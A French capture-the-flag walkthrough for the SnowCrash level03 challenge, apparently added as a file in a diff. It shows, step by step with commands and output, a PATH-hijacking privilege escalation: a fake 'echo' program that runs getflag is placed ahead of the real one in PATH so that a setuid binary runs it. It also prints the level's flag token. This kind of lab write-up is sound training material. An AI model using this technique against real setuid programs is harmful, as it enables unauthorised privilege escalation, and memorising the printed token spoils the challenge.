@@ -1,0 +1,88 @@
+Apres avoir fait la commande 'ls' je vois que j'ai un executable nommé 'level03'
+
+    level03@SnowCrash:~$ ls
+    level03
+
+Je lance l'executable 
+
+    level03@SnowCrash:~$ ./level03
+    Exploit me
+
+je lance la commande ltrace pour voir les appels de fonction faite par cette executable
+
+    level03@SnowCrash:~$ ltrace ./level03
+    __libc_start_main(0x80484a4, 1, 0xbffff7b4, 0x8048510, 0x8048580 <unfinished ...>
+    getegid()                                                                    = 2003
+    geteuid()                                                                    = 2003
+    setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                          = 0
+    setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                          = 0
+    system("/usr/bin/env echo Exploit me"Exploit me
+    <unfinished ...>
+    --- SIGCHLD (Child exited) ---
+    <... system resumed> )                                                       = 0
+    +++ exited (status 0) +++
+
+Il appel deux fonction getegid et geteuid ensuite il fait un system pour lancer la commande echo , par contre quand il appel
+cette fonction il n utilise pas le chemin absolu. Je fait 'ls -la' pour voir les autorisation du fichier
+
+
+    level03@SnowCrash:~$ ls -la
+    total 24
+    dr-x------ 1 level03 level03  120 Mar  5  2016 .
+    d--x--x--x 1 root    users    340 Aug 30  2015 ..
+    -r-x------ 1 level03 level03  220 Apr  3  2012 .bash_logout
+    -r-x------ 1 level03 level03 3518 Aug 30  2015 .bashrc
+    -rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
+    -r-x------ 1 level03 level03  675 Apr  3  2012 .profile
+
+je vois que le level03 sera exécuté avec les privilèges de l'utilisateur "flag03".
+A chaque fois que ce fichier est lancer il sera lancer avec les privilèges de l'utilisateur "flag03" et il fera appel a la fonction echo via la fonction system.
+Sachant que le chemin de echo n'est un un chemin absolu le programme parcourera tous le PATH de l'utilisateur actuel pour trouver la fonction 'echo'. 
+Ce que je vait faire c'est remplacer ce chemin PATH de sorte a ce que quand il parcoure ce chemin pour trouver la vrai fonction echo il tombe sur le mien
+en premier et le lancera.
+
+Je lance une commande pour trouver les dossiers ou je pourrai cree mon programme
+
+    level03@SnowCrash:~$ find / -writable -type d 2>/dev/null
+    /proc/2187/task/2187/fd
+    /proc/2187/fd
+    /run/shm
+    /run/lock
+    /tmp
+    /var/crash
+    /var/lib/php5
+    /var/tmp
+
+Donc je vais utiliser le dossier /var/crash et je vais ecrire un programme 
+
+    level03@SnowCrash:/var/crash$ vim test.c
+    level03@SnowCrash:/var/crash$ ls
+    test.c
+    level03@SnowCrash:/var/crash$ gcc test.c -o echo
+
+Voila le contenu du programme
+
+    #include <stdio.h>
+
+    int main()
+    {
+        system("getflag");
+        return 0;
+    }
+
+J'exporte mon nouveau path en y inserant le dossier ou ce trouve mon programme
+
+    level03@SnowCrash:~$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/var/crash/:/usr/bin/:/bin:/sbin
+
+Ensuite je re lance le programme 
+
+    level03@SnowCrash:~$ ./level03
+    Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
+
+Je teste le token 
+
+    level03@SnowCrash:~$ su level04
+    Password: qi0maab88jeaj46qoumi7maus
+    level04@SnowCrash:~$
+
+Ca fonctionne !
